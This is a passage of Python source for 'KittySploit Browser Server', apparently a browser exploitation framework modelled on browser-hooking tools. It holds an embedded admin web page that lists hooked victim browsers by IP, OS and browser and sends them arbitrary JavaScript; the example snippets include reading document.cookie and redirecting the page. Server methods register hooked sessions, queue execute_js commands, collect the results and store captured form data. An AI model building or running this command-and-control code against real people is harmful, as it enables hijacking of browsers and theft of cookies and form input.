            border-radius: 24px;
            border: 1px solid var(--border);
        }
        
        .panel h2 {
            margin-bottom: 1.5rem;
            font-size: 1.25rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .sessions-grid {
            display: grid;
            gap: 1rem;
            max-height: 600px;
            overflow-y: auto;
            padding-right: 0.5rem;
        }
        
        .sessions-grid::-webkit-scrollbar {
            width: 6px;
        }
        
        .sessions-grid::-webkit-scrollbar-track {
            background: transparent;
        }
        
        .sessions-grid::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
        }
        
        .session-card {
            background: rgba(255, 255, 255, 0.02);
            padding: 1.25rem;
            border-radius: 16px;
            border: 1px solid var(--border);
            transition: all 0.2s;
            cursor: pointer;
        }
        
        .session-card:hover {
            background: rgba(255, 255, 255, 0.04);
            border-color: rgba(255, 255, 255, 0.1);
        }
        
        .session-card.active {
            background: rgba(56, 189, 248, 0.1);
            border-color: var(--accent);
        }
        
        .session-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        
        .session-icons {
            display: flex;
            gap: 0.5rem;
        }
        
        .icon {
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 6px;
        }
        
        .icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: brightness(1.2);
        }
        
        .session-id {
            font-family: var(--font-mono);
            font-size: 0.9rem;
            color: var(--accent);
        }
        
        .session-info {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.75rem;
            font-size: 0.85rem;
        }
        
        .session-info-item {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }
        
        .session-info-label {
            color: var(--muted);
            font-size: 0.75rem;
        }
        
        .command-panel {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .session-select, .js-editor {
            width: 100%;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: var(--text);
            font-family: var(--font-main);
        }
        
        .session-select {
            padding: 0.75rem 1rem;
            cursor: pointer;
        }
        
        .js-editor {
            min-height: 200px;
            padding: 1rem;
            font-family: var(--font-mono);
            font-size: 0.9rem;
            resize: vertical;
            line-height: 1.5;
        }
        
        .session-select:focus, .js-editor:focus {
            outline: none;
            border-color: var(--accent);
            background: rgba(0, 0, 0, 0.3);
        }
        
        .btn {
            background: var(--accent);
            color: #000;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 12px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn:hover {
            background: var(--accent-hover);
            transform: translateY(-1px);
        }
        
        .log-panel {
            background: var(--panel);
            padding: 2rem;
            border-radius: 24px;
            border: 1px solid var(--border);
        }
        
        .log {
            background: rgba(0, 0, 0, 0.3);
            padding: 1.5rem;
            border-radius: 16px;
            font-family: var(--font-mono);
            font-size: 0.85rem;
            height: 300px;
            overflow-y: auto;
            border: 1px solid var(--border);
        }
        
        .log-entry {
            margin-bottom: 0.5rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }
        
        .log-timestamp {
            color: var(--muted);
            margin-right: 0.5rem;
        }
        
        .empty-state {
            text-align: center;
            padding: 3rem;
            color: var(--muted);
        }
        
        .empty-state-icon {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>KittySploit Browser Server</h1>
            <p>Professional Browser Exploitation Framework</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Server Status</h3>
                <div class="value" id="status">Loading...</div>
            </div>
            <div class="stat-card">
                <h3>Uptime</h3>
                <div class="value" id="uptime">--</div>
            </div>
            <div class="stat-card">
                <h3>Active Sessions</h3>
                <div class="value" id="totalSessions">0</div>
            </div>
            <div class="stat-card">
                <h3>Commands Executed</h3>
                <div class="value" id="totalCommands">0</div>
            </div>
        </div>
        
        <div class="main-content">
            <div class="panel">
                <h2>Active Sessions</h2>
                <div id="sessions-list" class="sessions-grid">
                    <div class="empty-state">
                        <div class="empty-state-icon">⏳</div>
                        <p>Loading sessions...</p>
                    </div>
                </div>
            </div>
            
            <div class="panel">
                <h2>Execute JavaScript</h2>
                <div class="command-panel">
                    <select id="session-select" class="session-select">
                        <option value="">Select a session...</option>
                    </select>
                    <textarea id="js-code" class="js-editor" placeholder="// Enter JavaScript code here&#10;// Examples:&#10;// alert('Hello from KittySploit');&#10;// window.location.href = 'https://example.com';&#10;// document.cookie;&#10;// fetch('https://api.example.com/data').then(r => r.json()).then(console.log);"></textarea>
                    <button class="btn" onclick="sendCommand()">Execute JavaScript</button>
                </div>
            </div>
        </div>
        
        <div class="log-panel">
            <h2>Activity Log</h2>
            <div id="log" class="log"></div>
        </div>
    </div>
    
    <script>
        // User agent parser with SVG icons support
        function parseUserAgent(userAgent) {
            const ua = userAgent.toLowerCase();
            
            // Detect OS
            let os = 'Unknown';
            let osIconFile = 'unknown';
            if (ua.includes('windows')) {
                os = 'Windows';
                osIconFile = 'windows';
            } else if (ua.includes('mac os') || ua.includes('macos')) {
                os = 'macOS';
                osIconFile = 'macos';
            } else if (ua.includes('linux') && !ua.includes('android')) {
                os = 'Linux';
                osIconFile = 'linux';
            } else if (ua.includes('android')) {
                os = 'Android';
                osIconFile = 'android';
            } else if (ua.includes('iphone') || ua.includes('ipad')) {
                os = 'iOS';
                osIconFile = 'ios';
            }
            
            // Detect Browser
            let browser = 'Unknown';
            let browserIconFile = 'unknown';
            if (ua.includes('edg')) {
                browser = 'Edge';
                browserIconFile = 'edge';
            } else if (ua.includes('chrome') && !ua.includes('edg')) {
                browser = 'Chrome';
                browserIconFile = 'chrome';
            } else if (ua.includes('firefox')) {
                browser = 'Firefox';
                browserIconFile = 'firefox';
            } else if (ua.includes('safari') && !ua.includes('chrome')) {
                browser = 'Safari';
                browserIconFile = 'safari';
            } else if (ua.includes('opera') || ua.includes('opr')) {
                browser = 'Opera';
                browserIconFile = 'opera';
            } else if (ua.includes('brave')) {
                browser = 'Brave';
                browserIconFile = 'brave';
            }
            
            return { 
                os, 
                osIcon: `/static/icons/os/${osIconFile}.svg`,
                browser, 
                browserIcon: `/static/icons/browsers/${browserIconFile}.svg`
            };
        }
        
        function formatTimeAgo(timestamp) {
            const now = new Date();
            const time = new Date(timestamp);
            const diff = Math.floor((now - time) / 1000);
            
            if (diff < 60) return 'Just now';
            if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
            if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
            return `${Math.floor(diff / 86400)}d ago`;
        }
        
        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                info: '#00ff00',
                error: '#ff4444',
                warning: '#ffaa00',
                success: '#00ff88'
            };
            const color = colors[type] || colors.info;
            logDiv.innerHTML += `<div class="log-entry"><span class="log-timestamp">[${timestamp}]</span> <span style="color: ${color}">${message}</span></div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function updateStatus() {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('status').textContent = data.running ? '🟢 Online' : '🔴 Offline';
                    document.getElementById('uptime').textContent = data.uptime || '--';
                    document.getElementById('totalSessions').textContent = data.total_sessions || 0;
                    document.getElementById('totalCommands').textContent = data.total_commands || 0;
                })
                .catch(error => log('Error updating status: ' + error, 'error'));
        }
        
        function updateSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(data => {
                    const sessionsList = document.getElementById('sessions-list');
                    const sessionSelect = document.getElementById('session-select');
                    const selectedSessionId = sessionSelect.value;
                    
                    sessionsList.innerHTML = '';
                    sessionSelect.innerHTML = '<option value="">Select a session...</option>';
                    
                    if (Object.keys(data).length === 0) {
                        sessionsList.innerHTML = `
                            <div class="empty-state">
                                <div class="empty-state-icon">🔍</div>
                                <p>No active sessions</p>
                            </div>
                        `;
                        return;
                    }
                    
                    for (const [sessionId, session] of Object.entries(data)) {
                        const uaInfo = parseUserAgent(session.user_agent);
                        const isActive = selectedSessionId === sessionId;
                        
                        const sessionCard = document.createElement('div');
                        sessionCard.className = `session-card ${isActive ? 'active' : ''}`;
                        sessionCard.onclick = () => {
                            sessionSelect.value = sessionId;
                            updateSessions();
                        };
                        
                        sessionCard.innerHTML = `
                            <div class="session-header">
                                <div class="session-icons">
                                    <div class="icon" title="${uaInfo.os}">
                                        <img src="${uaInfo.osIcon}" alt="${uaInfo.os}" onerror="this.src='/static/icons/os/unknown.svg'">
                                    </div>
                                    <div class="icon" title="${uaInfo.browser}">
                                        <img src="${uaInfo.browserIcon}" alt="${uaInfo.browser}" onerror="this.src='/static/icons/browsers/unknown.svg'">
                                    </div>
                                </div>
                                <div class="session-id">${sessionId.substring(0, 8)}...</div>
                            </div>
                            <div class="session-info">
                                <div class="session-info-item">
                                    <span class="session-info-label">IP:</span>
                                    <span>${session.ip_address}</span>
                                </div>
                                <div class="session-info-item">
                                    <span class="session-info-label">OS:</span>
                                    <span>${uaInfo.os}</span>
                                </div>
                                <div class="session-info-item">
                                    <span class="session-info-label">Browser:</span>
                                    <span>${uaInfo.browser}</span>
                                </div>
                                <div class="session-info-item">
                                    <span class="session-info-label">Commands:</span>
                                    <span>${session.commands_executed}</span>
                                </div>
                                <div class="session-info-item">
                                    <span class="session-info-label">Connected:</span>
                                    <span>${formatTimeAgo(session.connected_at)}</span>
                                </div>
                                <div class="session-info-item">
                                    <span class="session-info-label">Last Activity:</span>
                                    <span>${formatTimeAgo(session.last_activity)}</span>
                                </div>
                            </div>
                        `;
                        sessionsList.appendChild(sessionCard);
                        
                        const option = document.createElement('option');
                        option.value = sessionId;
                        option.textContent = `${sessionId.substring(0, 8)}... - ${uaInfo.os} ${uaInfo.browser} (${session.ip_address})`;
                        sessionSelect.appendChild(option);
                    }
                    
                    if (selectedSessionId && data[selectedSessionId]) {
                        sessionSelect.value = selectedSessionId;
                        updateSessions();
                    }
                })
                .catch(error => log('Error updating sessions: ' + error, 'error'));
        }
        
        function sendCommand() {
            const sessionId = document.getElementById('session-select').value;
            const jsCode = document.getElementById('js-code').value.trim();
            
            if (!sessionId) {
                log('Please select a session first', 'warning');
                return;
            }
            
            if (!jsCode) {
                log('Please enter JavaScript code', 'warning');
                return;
            }
            
            const command = {
                type: 'execute_js',
                code: jsCode
            };
            
            fetch(`/api/session/${sessionId}/command`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                log(`✅ JavaScript executed on session ${sessionId.substring(0, 8)}...`, 'success');
                document.getElementById('js-code').value = '';
            })
            .catch(error => {
                log('❌ Error sending command: ' + error, 'error');
            });
        }
        
        // Update every 2 seconds
        setInterval(() => {
            updateStatus();
            updateSessions();
        }, 2000);
        
        // Initial load
        updateStatus();
        updateSessions();
        log('🚀 Admin interface loaded', 'success');
        
        // Allow Ctrl+Enter to send command
        document.getElementById('js-code').addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter') {
                sendCommand();
            }
        });
    </script>
</body>
</html>
"""
    
    def register_browser(self, ip_address: str, user_agent: str, browser_info: Dict[str, Any]) -> str:
        """
        Register a new browser session or re-register an existing one
        
        Args:
            ip_address: IP address of the browser
            user_agent: User agent string
            browser_info: Browser information dict (may contain 'requested_session_id')
            
        Returns:
            str: Session ID (reused if requested, or new if not)
        """
        # Check if browser requested to reuse a session ID
        requested_session_id = browser_info.get('requested_session_id') if browser_info else None
        
        # If session ID is requested and doesn't exist, create it (re-registration)
        # If it already exists, we could either reuse it or create a new one
        # For now, we'll reuse the requested ID if it's valid format
        if requested_session_id and self._is_valid_session_id(requested_session_id):
            # Check if session already exists
            if requested_session_id in self.sessions:
                # Session already exists - update it
                session = self.sessions[requested_session_id]
                session.update_activity()
                session.ip_address = ip_address  # Update IP in case it changed
                session.user_agent = user_agent  # Update user agent
                session.browser_info = browser_info or {}
                print_debug(f"Browser re-registered with existing session: {requested_session_id}")
                print_debug(f"    IP: {ip_address}")
                print_debug(f"    User Agent: {user_agent}")
                return requested_session_id
            else:
                # Session doesn't exist but ID was requested - create new session with that ID
                session_id = requested_session_id
                print_debug(f"Browser re-registered with requested session ID: {session_id}")
        else:
            # Generate new session ID
            session_id = str(uuid.uuid4())
            print_debug(f"New browser session: {session_id}")
        
        # Create new session
        session = BrowserSession(session_id, ip_address, user_agent)
        session.browser_info = browser_info or {}
        
        self.sessions[session_id] = session
        self.stats['total_sessions'] += 1
        
        print_debug(f"    IP: {ip_address}")
        print_debug(f"    User Agent: {user_agent}")

        # Synchronize with the framework session manager if available
        session_manager = getattr(self.framework, 'session_manager', None)
        if session_manager:
            session_manager.register_browser_session(session_id, {
                'ip': ip_address,
                'user_agent': user_agent,
                'browser_info': session.browser_info,
                'connected_at': session.connected_at.isoformat(),
                'last_activity': session.last_activity.isoformat(),
                'commands_executed': session.commands_executed
            })
        
        return session_id
    
    def _is_valid_session_id(self, session_id: str) -> bool:
        """Check if session ID has valid UUID format"""
        try:
            uuid.UUID(session_id)
            return True
        except (ValueError, AttributeError):
            return False
    
    def get_session(self, session_id: str) -> Optional[BrowserSession]:
        """Get session by ID"""
        return self.sessions.get(session_id)
    
    def get_sessions(self) -> Dict[str, BrowserSession]:
        """Get all sessions"""
        return self.sessions
    
    def store_captured_data(self, data: Dict[str, Any]):
        """Store captured form data"""
        self.captured_data.append(data)
        # Keep only last 1000 entries to avoid memory issues
        if len(self.captured_data) > 1000:
            self.captured_data = self.captured_data[-1000:]
    
    def get_captured_data(self) -> List[Dict[str, Any]]:
        """Get all captured form data"""
        return self.captured_data
    
    def send_command_to_session(self, session_id: str, command: Dict[str, Any]) -> bool:
        """
        Send command to specific session via HTTP polling
        
        Returns:
            bool: True if command was queued successfully, False if session not found
        """
        session = self.get_session(session_id)
        if session:
            # Preserve command ID if already set, otherwise generate a new one
            if 'id' not in command or not command['id']:
                command['id'] = str(uuid.uuid4())
            # Preserve timestamp if already set, otherwise set current time
            if 'timestamp' not in command or not command['timestamp']:
                command['timestamp'] = datetime.now().isoformat()
            
            # Debug: log command details
            print_debug(f"Queuing command for session {session_id[:8]}...")
            print_debug(f"  Type: {command.get('type', 'unknown')}")
            print_debug(f"  ID: {command.get('id', 'none')}")
            if command.get('type') == 'execute_js':
                code_preview = command.get('code', '')[:100]
                print_debug(f"  Code preview: {code_preview}...")
            
            session.add_command(command)
            self.stats['total_commands'] += 1
            
            print_debug(f"Command queued for session {session_id[:8]}...: {command.get('type', 'unknown')} (HTTP polling)")

            session_manager = getattr(self.framework, 'session_manager', None)
            if session_manager:
                session_manager.handle_commands_sent(session_id, [command])
                session_manager.update_browser_session(session_id, {
                    'pending_commands': len(session.commands_queue)
                })
            
            return True
        else:
            print_error(f"Session {session_id} not found!")
            return False
    
    def handle_command_response(self, session_id: str, command_id: str, result: Any):
        """Handle response from browser"""
        session = self.get_session(session_id)
        if session:
            session.update_activity()
            session.commands_executed += 1
            session.add_response({
                'command_id': command_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            })
            print_debug(f"Response from session {session_id}: {result}")

            session_manager = getattr(self.framework, 'session_manager', None)
            if session_manager:
                session_manager.update_browser_session(session_id, {
                    'last_activity': session.last_activity.isoformat(),
                    'commands_executed': session.commands_executed,
                    'last_response': result
                })
        else:
            print_error(f"Session {session_id} not found for response!")
